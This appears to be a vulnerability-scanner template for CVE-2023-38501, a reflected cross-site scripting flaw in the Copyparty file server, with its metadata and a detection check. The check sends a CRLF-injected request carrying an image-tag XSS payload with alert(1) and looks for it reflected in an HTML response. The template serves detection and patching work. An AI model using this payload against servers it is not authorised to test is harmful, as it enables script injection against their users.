id: cve-2023-38501

info:
  name: Copyparty <=1.8.6 Reflected XSS
  author: Vartamtezidis Theodoros (@TheHackyDog)
  severity: medium
  description: |
    Copyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting (XSS) attack. This vulnerability allows attackers to execute malicious JavaScript code by tricking users into accessing a crafted link.
  reference:
    - https://github.com/9001/copyparty/
    - https://github.com/9001/copyparty/releases/tag/v1.8.6
  tags: xss,reflected

http:
  - method: GET
    path:
      - "{{BaseURL}}/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<img src=copyparty onerror=alert(1)>"
      - type: word
        part: header
        words:
          - "text/html"